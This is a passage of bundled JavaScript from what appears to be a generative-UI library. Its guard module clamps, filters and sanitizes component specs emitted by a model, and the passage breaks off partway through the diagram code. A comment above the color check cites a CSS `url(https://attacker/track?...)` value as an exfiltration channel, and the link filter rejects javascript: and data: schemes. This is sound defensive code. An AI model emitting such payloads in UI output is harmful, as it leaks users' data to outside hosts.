import { readFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { readFileSync } from "node:fs";
//#region src/client/spec.ts
/**
* Wrap a bare component object into a col root. Returns null when `value` is
* not component-shaped (no usable `type`). `panel`/`append` live on the root
* spec, so they are hoisted onto the wrapper.
*/
function wrapSingleComponentRoot(value) {
	if (typeof value !== "object" || value === null) return null;
	const v = value;
	if (typeof v.type !== "string" || v.type === "") return null;
	const root = {
		type: "col",
		items: [value]
	};
	if (v.panel === true) root.panel = true;
	if (v.append === true) root.append = true;
	return root;
}
//#endregion
//#region src/client/guard.ts
/** Hard resource limits enforced by repair (and mirrored at render time). */
const GENUI_LIMITS = {
	/** Maximum nesting depth of the component tree. */
	maxDepth: 8,
	/** Maximum total nodes across the whole spec. */
	maxNodes: 200,
	/** Maximum length of any plain string field. */
	maxString: 2e3,
	/** Maximum length of a `code` body. */
	maxCode: 12e3,
	/** Maximum length of a mermaid source. */
	maxMermaid: 8e3,
	/** Maximum `grid` columns. */
	maxGridCols: 12,
	/** Maximum `tabs` count. */
	maxTabs: 12,
	/** Maximum `accordion` items. */
	maxAccordionItems: 24,
	/** Maximum `list` items. */
	maxListItems: 50,
	/** Maximum `select`/`radio` options. */
	maxOptions: 50,
	/** Maximum `table` rows / columns. */
	maxTableRows: 50,
	maxTableCols: 12,
	/** Maximum `chart` data points per series. */
	maxChartPoints: 60,
	/** Maximum `plot` series and per-series parameters. */
	maxPlotSeries: 8,
	maxPlotParams: 6,
	/** Maximum `scene3d` meshes. */
	maxMeshes: 5,
	/** Maximum `quiz` options. */
	maxQuizOptions: 8,
	/** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
	maxSteps: 24,
	maxTimelineItems: 24,
	maxBreadcrumbItems: 12,
	maxKeyValuePairs: 24,
	/** Maximum `file-tree` nesting. */
	maxTreeDepth: 6,
	/** Maximum `diagram` nodes / edges / zones / focal accents (editorial
	* complexity budget, mirroring diagram-design's §7 limits). */
	maxDiagramNodes: 9,
	maxDiagramEdges: 12,
	maxDiagramZones: 3,
	maxDiagramFocal: 2,
	maxDiagramLabel: 14,
	/** Maximum depth of an `echart` option object (prevents pathological nested
	* ECharts configs from stalling the guard walk). */
	maxEChartOptionDepth: 10,
	/** Maximum length of any single array inside an `echart` option (prevents
	* a model from stalling rendering with `series.data` of hundreds of
	* thousands of points). */
	maxEChartArrayLen: 500,
	/** Maximum total entries (object keys + array elements) traversed while
	* sanitizing an `echart` option. Bounds the walk so a pathologically
	* large option object cannot stall the guard. */
	maxEChartOptionNodes: 2e3
};
/** Is `v` one of `values`? (enum guard) */
function inEnum(v, values) {
	return typeof v === "string" && values.includes(v);
}
/** String field: truncate a string to `cap`, or undefined when not a string. */
function str(v, cap) {
	return typeof v === "string" ? v.slice(0, cap) : void 0;
}
/**
* Color field: the value lands in an inline `style` (background/stroke) or
* THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
* (or a hostile spec) could emit `url(https://attacker/track?...)` and the
* browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
* functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
* to the component's default palette.
*/
const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/;
function color(v) {
	if (typeof v !== "string") return void 0;
	const s = v.trim();
	return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : void 0;
}
/**
* Link target field: only http(s) and mailto survive. `javascript:`/`data:`
* and every other scheme degrade to a plain-text node — the model's link is
* display, not an execution channel.
*/
function safeHref(v) {
	if (typeof v !== "string") return void 0;
	const s = v.trim();
	if (s.length > 2048) return void 0;
	return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : void 0;
}
/** Media loads bytes, so accept only browser-reachable http(s) or same-origin
* relative paths. Active/local schemes and protocol-relative URLs are
* rejected. The renderer always keeps playback user-controlled. */
function safeMediaSrc(v) {
	if (typeof v !== "string") return void 0;
	const s = v.trim();
	if (s === "" || s.length > 2048) return void 0;
	if (/^https?:\/\//i.test(s)) return s;
	if (/^[a-z][a-z0-9+.-]*:/i.test(s) || /^[/\\]{2}/.test(s)) return void 0;
	return s;
}
/** Finite-number field: clamp into [min, max], or undefined when not finite. */
function num(v, min, max) {
	return typeof v === "number" && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : void 0;
}
/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
function int(v, min, max) {
	return typeof v === "number" && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : void 0;
}
/** Optional enum field: the value when it matches, otherwise undefined. */
function enu(v, values) {
	return inEnum(v, values) ? v : void 0;
}
/** Plain object (not array, not null). */
function obj(v) {
	return typeof v === "object" && v !== null && !Array.isArray(v) ? v : void 0;
}
/**
* Optional-field spread helper. `exactOptionalPropertyTypes` forbids
* `{ gap: number | undefined }`; computing the value into a const first and
* spreading `opt('gap', g)` keeps every optional field either absent or a
* plain value.
*/
function opt(key, value) {
	return value === void 0 ? {} : { [key]: value };
}
const TEXT_SIZES = [
	"h1",
	"h2",
	"h3",
	"body",
	"muted",
	"caption"
];
const BUTTON_TONES = [
	"primary",
	"danger",
	"success",
	"ghost"
];
const BADGE_TONES = [
	"success",
	"warn",
	"danger",
	"accent"
];
const INPUT_TYPES = [
	"text",
	"email",
	"password"
];
const CALLOUT_TONES = [
	"info",
	"success",
	"warning",
	"error"
];
const CHART_KINDS = [
	"bars",
	"line",
	"donut"
];
const PLOT_KINDS = [
	"line",
	"area",
	"scatter"
];
const MEDIA_ASPECT_RATIOS = [
	"16:9",
	"4:3",
	"1:1",
	"9:16"
];
const MESH_SHAPES = [
	"box",
	"sphere",
	"cone",
	"cylinder",
	"torus"
];
const FILE_TYPES = ["file", "dir"];
const DIAGRAM_KINDS = [
	"architecture",
	"it-state",
	"flowchart",
	"sequence",
	"state",
	"er",
	"timeline",
	"swimlane",
	"quadrant",
	"radar",
	"loop",
	"nested",
	"tree",
	"org-chart",
	"layers",
	"venn",
	"pyramid",
	"bar",
	"line",
	"gantt",
	"scatter",
	"high-level",
	"process",
	"medallion",
	"data-flow",
	"dp-integration",
	"dp-security-matrix"
];
const DIAGRAM_NODE_TYPES = [
	"focal",
	"backend",
	"store",
	"external",
	"input",
	"optional",
	"security"
];
const DIAGRAM_VARIANTS = [
	"light",
	"dark",
	"editorial"
];
const DIAGRAM_EDGE_KINDS = [
	"solid",
	"dashed",
	"accent",
	"link"
];
const DIAGRAM_ROUTES = [
	"auto",
	"orthogonal",
	"straight"
];
const ECHART_PRESETS = [
	"bar",
	"line",
	"area",
	"pie",
	"scatter"
];
/** Walk `list` with the shared node budget; drops invalid entries. */
function repairItems(list, ctx, depth) {
	if (!Array.isArray(list)) return [];
	const out = [];
	for (const item of list) {
		if (ctx.remaining <= 0) break;
		ctx.remaining -= 1;
		const node = repairNode(item, ctx, depth);
		if (node !== null) out.push(node);
	}
	return out;
}
function repairNode(value, ctx, depth) {
	if (depth > GENUI_LIMITS.maxDepth) return null;
	const v = obj(value);
	if (v === void 0) return null;
	const type = v.type;
	if (typeof type !== "string") return null;
	switch (type) {
		case "text": {
			const content = str(v.content, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString);
			if (content === void 0) return null;
			return {
				type: "text",
				content,
				...opt("size", enu(v.size, TEXT_SIZES)),
				...opt("center", v.center === true ? true : void 0)
			};
		}
		case "row": return {
			type: "row",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("wrap", v.wrap === true ? true : void 0),
			...opt("spacer", v.spacer === true ? true : void 0)
		};
		case "col": return {
			type: "col",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("gap", num(v.gap, 0, 96))
		};
		case "grid": return {
			type: "grid",
			cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1,
			items: repairItems(v.items, ctx, depth + 1)
		};
		case "card": return {
			type: "card",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("title", str(v.title, GENUI_LIMITS.maxString))
		};
		case "button": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "button",
				label,
				...opt("tone", enu(v.tone, BUTTON_TONES)),
				...opt("full", v.full === true ? true : void 0),
				...opt("small", v.small === true ? true : void 0),
				...opt("icon", str(v.icon, 64)),
				...opt("action", str(v.action, 200))
			};
		}
		case "input": return {
			type: "input",
			...opt("label", str(v.label, GENUI_LIMITS.maxString)),
			...opt("placeholder", str(v.placeholder, GENUI_LIMITS.maxString)),
			...opt("value", str(v.value, GENUI_LIMITS.maxString)),
			...opt("inputType", enu(v.inputType, INPUT_TYPES)),
			...opt("action", str(v.action, 200)),
			...opt("id", str(v.id, 200))
		};
		case "select": {
			const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString);
			if (options === void 0) return null;
			return {
				type: "select",
				options,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("action", str(v.action, 200)),
				...opt("selected", int(v.selected, 0, options.length - 1)),
				...opt("id", str(v.id, 200))
			};
		}
		case "checkbox": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "checkbox",
				label,
				...opt("checked", v.checked === true ? true : void 0),
				...opt("action", str(v.action, 200))
			};
		}
		case "link": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "link",
				label,
				...opt("href", safeHref(v.href))
			};
		}
		case "audio": {
			const src = safeMediaSrc(v.src);
			if (src === void 0) return null;
			return {
				type: "audio",
				src,
				...opt("alt", str(v.alt, GENUI_LIMITS.maxString)),
				...opt("loop", v.loop === true ? true : void 0)
			};
		}
		case "video": {
			const src = safeMediaSrc(v.src);
			if (src === void 0) return null;
			return {
				type: "video",
				src,
				...opt("alt", str(v.alt, GENUI_LIMITS.maxString)),
				...opt("poster", safeMediaSrc(v.poster)),
				...opt("loop", v.loop === true ? true : void 0),
				...opt("muted", v.muted === true ? true : void 0),
				...opt("aspectRatio", enu(v.aspectRatio, MEDIA_ASPECT_RATIOS))
			};
		}
		case "badge": {
			const label = str(v.label, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString) ?? str(v.value, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "badge",
				label,
				...opt("tone", enu(v.tone, BADGE_TONES)),
				...opt("icon", str(v.icon, 64))
			};
		}
		case "stat": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			const value = str(v.value, 128);
			if (label === void 0 || value === void 0) return null;
			return {
				type: "stat",
				label,
				value,
				...opt("delta", str(v.delta, 64))
			};
		}
		case "progress": {
			const value = num(v.value, 0, 100);
			if (value === void 0) return null;
			return {
				type: "progress",
				value,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("valueLabel", str(v.valueLabel, 64))
			};
		}
		case "divider": return { type: "divider" };
		case "spacer": return { type: "spacer" };
		case "avatar": {
			const name = str(v.name, 64);
			if (name === void 0) return null;
			return {
				type: "avatar",
				name,
				...opt("color", color(v.color))
			};
		}
		case "list": {
			const items = repairListItems(v.items, GENUI_LIMITS.maxListItems, ctx, depth + 1);
			if (items === void 0) return null;
			return {
				type: "list",
				items
			};
		}
		case "table": {
			const { rawCols, rawRows } = normalizeTableFields(v);
			const columns = repairStrings(rawCols, GENUI_LIMITS.maxTableCols, 128);
			const rows = repairRows(rawRows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols);
			if (columns === void 0 || rows === void 0) return null;
			return {
				type: "table",
				columns,
				rows
			};
		}
		case "chart": {
			const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints);
			const series = Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : void 0;
			if (data === void 0 && series === void 0) return null;
			return {
				type: "chart",
				data: data ?? [],
				...opt("kind", enu(v.kind, CHART_KINDS)),
				...opt("series", series)
			};
		}
		case "tabs": {
			const tabs = repairTabs(v.tabs, ctx, depth);
			if (tabs === void 0) return null;
			return {
				type: "tabs",
				tabs
			};
		}
		case "plot": {
			const series = repairPlotSeries(v.series, GENUI_LIMITS.maxPlotSeries);
			if (series === void 0) return null;
			return {
				type: "plot",
				series,
				...opt("xMin", num(v.xMin, -1e6, 1e6)),
				...opt("xMax", num(v.xMax, -1e6, 1e6)),
				...opt("yMin", num(v.yMin, -1e9, 1e9)),
				...opt("yMax", num(v.yMax, -1e9, 1e9)),
				...opt("title", str(v.title, GENUI_LIMITS.maxString))
			};
		}
		case "callout": {
			const content = str(v.content, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString);
			if (content === void 0) return null;
			return {
				type: "callout",
				content,
				...opt("tone", enu(v.tone, CALLOUT_TONES)),
				...opt("title", str(v.title, GENUI_LIMITS.maxString))
			};
		}
		case "steps": {
			const steps = repairSteps(v.steps);
			if (steps === void 0) return null;
			return {
				type: "steps",
				steps,
				...opt("current", int(v.current, 0, steps.length))
			};
		}
		case "keyvalue": {
			const pairs = repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs);
			if (pairs === void 0) return null;
			return {
				type: "keyvalue",
				pairs
			};
		}
		case "diff": {
			const diffs = repairDiffs(v.diffs);
			if (diffs === void 0) return null;
			return {
				type: "diff",
				diffs
			};
		}
		case "json":
			if (!("value" in v)) return null;
			return {
				type: "json",
				value: v.value
			};
		case "code": {
			const code = str(v.code, GENUI_LIMITS.maxCode);
			if (code === void 0) return null;
			return {
				type: "code",
				code,
				...opt("lang", str(v.lang, 64))
			};
		}
		case "radio": {
			const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString);
			if (options === void 0) return null;
			return {
				type: "radio",
				options,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("selected", int(v.selected, 0, options.length - 1)),
				...opt("action", str(v.action, 200)),
				...opt("group", str(v.group, 200)),
				...opt("answer", typeof v.answer === "number" && Number.isFinite(v.answer) && v.answer >= 0 && v.answer < options.length ? Math.trunc(v.answer) : typeof v.answer === "string" ? v.answer.slice(0, 512) : void 0),
				...opt("explanation", str(v.explanation, GENUI_LIMITS.maxString))
			};
		}
		case "submit": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			const action = str(v.action, 200);
			if (label === void 0) return null;
			return {
				type: "submit",
				label,
				...opt("action", action),
				...opt("resetAction", str(v.resetAction, 200)),
				...opt("groups", repairStrings(v.groups, GENUI_LIMITS.maxOptions, 200))
			};
		}
		case "switch": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "switch",
				label,
				...opt("checked", v.checked === true ? true : void 0),
				...opt("action", str(v.action, 200))
			};
		}
		case "slider": {
			const min = num(v.min, -1e9, 1e9) ?? 0;
			const max = num(v.max, -1e9, 1e9) ?? 100;
			const lo = Math.min(min, max);
			const hi = Math.max(min, max);
			const step = num(v.step, 1e-9, Math.max(hi - lo, 1e-9));
			const value = num(v.value, lo, hi) ?? lo;
			return {
				type: "slider",
				min: lo,
				max: hi,
				...opt("step", step),
				value,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("action", str(v.action, 200)),
				...opt("id", str(v.id, 200))
			};
		}
		case "textarea": return {
			type: "textarea",
			...opt("label", str(v.label, GENUI_LIMITS.maxString)),
			...opt("placeholder", str(v.placeholder, GENUI_LIMITS.maxString)),
			...opt("rows", int(v.rows, 1, 30)),
			...opt("value", str(v.value, GENUI_LIMITS.maxString)),
			...opt("action", str(v.action, 200)),
			...opt("id", str(v.id, 200))
		};
		case "accordion": {
			const items = repairAccordion(v.items, ctx, depth);
			if (items === void 0) return null;
			return {
				type: "accordion",
				items
			};
		}
		case "copy": {
			const text = str(v.text, GENUI_LIMITS.maxCode);
			if (text === void 0) return null;
			return {
				type: "copy",
				text,
				...opt("label", str(v.label, 128))
			};
		}
		case "mermaid": {
			const code = str(v.code, GENUI_LIMITS.maxMermaid);
			if (code === void 0) return null;
			return {
				type: "mermaid",
				code
			};
		}
		case "scene3d": {
			const meshes = repairMeshes(v.meshes);
			if (meshes === void 0) return null;
			return {
				type: "scene3d",
				meshes,
				...opt("title", str(v.title, GENUI_LIMITS.maxString)),
				...opt("ambient", num(v.ambient, 0, 2)),
				...opt("background", color(v.background))
			};
		}
		case "diagram": return repairDiagram(v);
		case "timeline": {
			const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems);
			if (items === void 0) return null;
			return {
				type: "timeline",
				items
			};
		}
		case "file-tree": {
			const items = repairTree(v.items, GENUI_LIMITS.maxListItems);
			if (items === void 0) return null;
			return {
				type: "file-tree",
				items
			};
		}
		case "breadcrumb": {
			const items = repairStrings(v.items, GENUI_LIMITS.maxBreadcrumbItems, GENUI_LIMITS.maxString);
			if (items === void 0) return null;
			return {
				type: "breadcrumb",
				items
			};
		}
		case "quiz": {
			const question = str(v.question, GENUI_LIMITS.maxString);
			const options = repairQuizOptions(v.options);
			if (question === void 0 || options === void 0) return null;
			return {
				type: "quiz",
				question,
				options,
				...opt("explanation", str(v.explanation, GENUI_LIMITS.maxString)),
				...opt("id", str(v.id, 200)),
				...opt("action", str(v.action, 200))
			};
		}
		case "echart": {
			const data = v.data !== void 0 ? repairChartData(v.data, GENUI_LIMITS.maxChartPoints) : void 0;
			const series = v.series !== void 0 && Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : void 0;
			const sanitized = v.option !== void 0 ? sanitizeEChartOption(v.option, 0, { count: GENUI_LIMITS.maxEChartOptionNodes }) : void 0;
			const option = sanitized === void 0 || typeof sanitized !== "object" || sanitized === null || Array.isArray(sanitized) ? void 0 : sanitized;
			if (option === void 0 && data === void 0 && series === void 0) return null;
			return {
				type: "echart",
				...opt("title", str(v.title, GENUI_LIMITS.maxString)),
				...opt("height", int(v.height, 100, 800)),
				...opt("preset", enu(v.preset, ECHART_PRESETS)),
				...opt("data", data),
				...opt("series", series),
				...opt("option", option)
			};
		}
		default: return value;
	}
}
function repairStrings(v, cap, strCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		if (typeof item === "string") out.push(item.slice(0, strCap));
		else if (item !== null && typeof item === "object") {
			const o = item;
			const s = typeof o.label === "string" ? o.label : typeof o.value === "string" ? o.value : typeof o.title === "string" ? o.title : JSON.stringify(item);
			out.push(s.slice(0, strCap));
		}
	}
	return out;
}
function repairListItems(v, cap, ctx, depth) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		if (typeof item === "string") {
			out.push(item.slice(0, GENUI_LIMITS.maxString));
			continue;
		}
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, GENUI_LIMITS.maxString);
		if (title !== void 0) {
			out.push({
				title,
				...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString))
			});
			continue;
		}
		if (o !== void 0 && typeof o.type === "string") {
			if (ctx.remaining <= 0) break;
			ctx.remaining -= 1;
			const node = repairNode(o, ctx, depth);
			if (node !== null) out.push(node);
		}
	}
	return out;
}
function repairRows(v, rowCap, colCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const row of v) {
		if (out.length >= rowCap) break;
		if (!Array.isArray(row)) continue;
		const cells = [];
		for (const cell of row) {
			if (cells.length >= colCap) break;
			if (typeof cell === "string") cells.push(cell.slice(0, 256));
			else if (typeof cell === "number" && Number.isFinite(cell)) cells.push(cell);
		}
		if (cells.length > 0) out.push(cells);
	}
	return out;
}
function repairChartData(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const datum of v) {
		if (out.length >= cap) break;
		const o = obj(datum);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		const value = o === void 0 ? void 0 : num(o.value, -0xe8d4a51000, 0xe8d4a51000);
		if (label === void 0 || value === void 0) continue;
		out.push({
			label,
			value,
			...opt("color", o === void 0 ? void 0 : color(o.color))
		});
	}
	return out;
}
function repairSeries(v, cap, pointCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= cap) break;
		const o = obj(s);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		const data = o === void 0 ? void 0 : repairChartData(o.data, pointCap);
		if (label === void 0 || data === void 0) continue;
		out.push({
			label,
			data,
			...opt("color", o === void 0 ? void 0 : color(o.color))
		});
	}
	return out;
}
function repairTabs(v, ctx, depth) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const tab of v) {
		if (out.length >= GENUI_LIMITS.maxTabs) break;
		const o = obj(tab);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		if (label === void 0 || o === void 0) continue;
		const rawItems = o.items !== void 0 ? o.items : o.content !== void 0 ? Array.isArray(o.content) ? o.content : [o.content] : void 0;
		out.push({
			label,
			items: repairItems(rawItems, ctx, depth + 1)
		});
	}
	return out;
}
/** Header text for an object-shaped table column ({title,key} antd style). */
function columnHeaderText(c) {
	const o = obj(c);
	if (o === void 0) return String(c);
	for (const k of [
		"title",
		"label",
		"key",
		"dataIndex"
	]) {
		const s = o[k];
		if (typeof s === "string" && s !== "") return s;
	}
	return JSON.stringify(c);
}
/** Row key for an object-shaped column, mirroring columnHeaderText's order. */
function columnKeyOf(c) {
	const o = obj(c);
	if (o === void 0) return void 0;
	for (const k of [
		"key",
		"dataIndex",
		"title",
		"label"
	]) {
		const s = o[k];
		if (typeof s === "string" && s !== "") return s;
	}
}
/** Cell text for object-array rows: strings/finite numbers pass through,
* everything else stringifies so the column alignment is preserved
* (repairRows would drop null/undefined cells and shift the row). */
function cellText(v) {
	if (typeof v === "string") return v;
	if (typeof v === "number" && Number.isFinite(v)) return v;
	if (v === null || v === void 0) return "";
	return JSON.stringify(v);
}
/** Table aliases and row/column diagnostics share the renderer normalization. */
function normalizeTableFields(v, report) {
	const rowField = v.rows !== void 0 ? "rows" : "data";
	let rawCols = v.columns;
	let rawRows = v[rowField];
	if (Array.isArray(rawCols)) rawCols = rawCols.map((column, i) => {
		if (typeof column === "string") return column;
		if (obj(column) !== void 0) {
			if (columnKeyOf(column) === void 0) report?.(`columns[${i}]`, "string or object with title/label/key/dataIndex", column);
			return columnHeaderText(column);
		}
		report?.(`columns[${i}]`, "string or named column object", column);
		return column;
	});
	if (Array.isArray(rawRows)) {
		const first = rawRows.find((row) => obj(row) !== void 0);
		const keys = Array.isArray(v.columns) && obj(v.columns[0]) !== void 0 ? v.columns.map(columnKeyOf).filter((key) => key !== void 0) : first === void 0 ? [] : Object.keys(first);
		rawRows = rawRows.map((row, i) => {
			const record = obj(row);
			let cells = row;
			let path = `${rowField}[${i}]`;
			if (record !== void 0) {
				if ("cells" in record) {
					cells = record.cells;
					path += ".cells";
				} else cells = keys.map((key) => cellText(record[key]));
			}
			if (!Array.isArray(cells)) {
				report?.(path, "cell array or row object", cells);
				return cells;
			}
			for (let j = 0; j < Math.min(cells.length, GENUI_LIMITS.maxTableCols); j++) {
				const cell = cells[j];
				if (typeof cell !== "string" && !(typeof cell === "number" && Number.isFinite(cell))) report?.(`${path}[${j}]`, "string or finite number", cell);
			}
			return cells;
		});
	}
	return {
		rawCols,
		rawRows
	};
}
function repairPlotSeries(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= cap) break;
		const o = obj(s);
		const expr = o === void 0 ? void 0 : str(o.expr, 512);
		if (expr === void 0 || o === void 0) continue;
		const params = [];
		if (Array.isArray(o.params)) for (const p of o.params) {
			if (params.length >= GENUI_LIMITS.maxPlotParams) break;
			const po = obj(p);
			const name = po === void 0 ? void 0 : str(po.name, 64);
			const value = po === void 0 ? void 0 : num(po.value, -1e9, 1e9);
			if (name === void 0 || value === void 0) continue;
			params.push({
				name,
				value,
				...opt("min", po === void 0 ? void 0 : num(po.min, -1e9, 1e9)),
				...opt("max", po === void 0 ? void 0 : num(po.max, -1e9, 1e9)),
				...opt("step", po === void 0 ? void 0 : num(po.step, 1e-9, 1e9)),
				...opt("animateTo", po === void 0 ? void 0 : num(po.animateTo, -1e9, 1e9)),
				...opt("durationMs", po === void 0 ? void 0 : num(po.durationMs, 1, 12e4)),
				...opt("loop", po === void 0 ? void 0 : po.loop === true ? true : void 0)
			});
		}
		out.push({
			expr,
			...opt("label", str(o.label, 128)),
			...opt("color", color(o.color)),
			...opt("kind", enu(o.kind, PLOT_KINDS)),
			...opt("params", params.length > 0 ? params : void 0)
		});
	}
	return out;
}
function repairSteps(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= GENUI_LIMITS.maxSteps) break;
		const o = obj(s);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0) continue;
		out.push({
			title,
			...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString))
		});
	}
	return out;
}
function repairPairs(v, cap, report) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const [index, p] of v.entries()) {
		if (out.length >= cap) break;
		const o = obj(p);
		const key = o === void 0 ? void 0 : str(o.key, 256);
		const value = o === void 0 ? void 0 : str(o.value, GENUI_LIMITS.maxString);
		if (key === void 0 || value === void 0) {
			if (o === void 0) report?.(index, "", "object", p);
			else {
				if (key === void 0) report?.(index, ".key", "string", o.key);
				if (value === void 0) report?.(index, ".value", "string", o.value);
			}
			continue;
		}
		out.push({
			key,
			value
		});
	}
	return out;
}
function repairDiffs(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const d of v) {
		if (out.length >= 24) break;
		const o = obj(d);
		const path = o === void 0 ? void 0 : str(o.path, 1024);
		const newText = o === void 0 ? void 0 : str(o.newText, 2e4);
		if (path === void 0 || newText === void 0) continue;
		const old = o === void 0 ? void 0 : o.oldText;
		out.push({
			path,
			newText,
			oldText: old === null || typeof old !== "string" ? null : old.slice(0, 2e4)
		});
	}
	return out;
}
function repairAccordion(v, ctx, depth) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= GENUI_LIMITS.maxAccordionItems) break;
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0 || o === void 0) continue;
		out.push({
			title,
			items: repairItems(o.items, ctx, depth + 1)
		});
	}
	return out;
}
function repairMeshes(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const m of v) {
		if (out.length >= GENUI_LIMITS.maxMeshes) break;
		const o = obj(m);
		const shape = o === void 0 ? void 0 : enu(o.shape, MESH_SHAPES);
		if (shape === void 0) continue;
		const scale = o === void 0 ? void 0 : num(o.scale, -1e6, 1e6) ?? tuple3(o.scale);
		const size = o === void 0 ? void 0 : num(o.size, -1e6, 1e6) ?? tuple3(o.size);
		out.push({
			shape,
			...opt("color", o === void 0 ? void 0 : color(o.color)),
			...opt("position", o === void 0 ? void 0 : tuple3(o.position)),
			...opt("rotation", o === void 0 ? void 0 : tuple3(o.rotation)),
			...opt("scale", scale),
			...opt("size", size)
		});
	}
	return out;
}
function tuple3(v) {
	if (!Array.isArray(v) || v.length !== 3) return void 0;
	const [a, b, c] = v;
	if (typeof a !== "number" || !Number.isFinite(a) || typeof b !== "number" || !Number.isFinite(b) || typeof c !== "number" || !Number.isFinite(c)) return void 0;
	return [
		Math.min(1e6, Math.max(-1e6, a)),
		Math.min(1e6, Math.max(-1e6, b)),
		Math.min(1e6, Math.max(-1e6, c))
	];
}
/** Clamp a coordinate/size to the 4px editorial grid. */
function grid4(v, min, max) {
	return Math.min(max, Math.max(min, Math.round(v / 4) * 4));
}
function repairDiagramNodes(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	const seen = /* @__PURE__ */ new Set();
	for (const raw of v) {
		if (out.length >= GENUI_LIMITS.maxDiagramNodes) break;
		const o = obj(raw);
		if (o === void 0) continue;
		const id = str(o.id, 128);
		const label = str(o.label, GENUI_LIMITS.maxString);
		if (id === void 0 || label === void 0) continue;
		if (seen.has(id)) continue;
		seen.add(id);
		const nodeType = enu(o.type, DIAGRAM_NODE_TYPES);
		const x = o.x === void 0 ? void 0 : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6);
		const y = o.y === void 0 ? void 0 : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6);
		const w = o.w === void 0 ? void 0 : grid4(num(o.w, -1e6, 1e6) ?? 96, 40, 2e3);
		const h = o.h === void 0 ? void 0 : grid4(num(o.h, -1e6, 1e6) ?? 48, 24, 1200);
		out.push({
			id,
			label,
			...opt("sub", str(o.sub, 256)),
			...opt("type", nodeType),
			...opt("x", x),
			...opt("y", y),
			...opt("w", w),
			...opt("h", h),
			...opt("tag", str(o.tag, 32))
		});
	}
	return out;
}
function repairDiagramEdges(v) {
	if (v === void 0) return [];
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const raw of v) {
		if (out.length >= GENUI_LIMITS.maxDiagramEdges) break;
		const o = obj(raw);
		if (o === void 0) continue;
		const from = str(o.from, 128);
		const to = str(o.to, 128);
		if (from === void 0 || to === void 0) continue;
		out.push({
			from,
			to,
			...opt("label", str(o.label, GENUI_LIMITS.maxDiagramLabel)),
			...opt("kind", enu(o.kind, DIAGRAM_EDGE_KINDS)),
			...opt("route", enu(o.route, DIAGRAM_ROUTES))
		});
	}
	return out;
}
function repairDiagramTheme(v) {
	const o = obj(v);
	if (o === void 0) return void 0;
	const out = {};
	for (const key of [
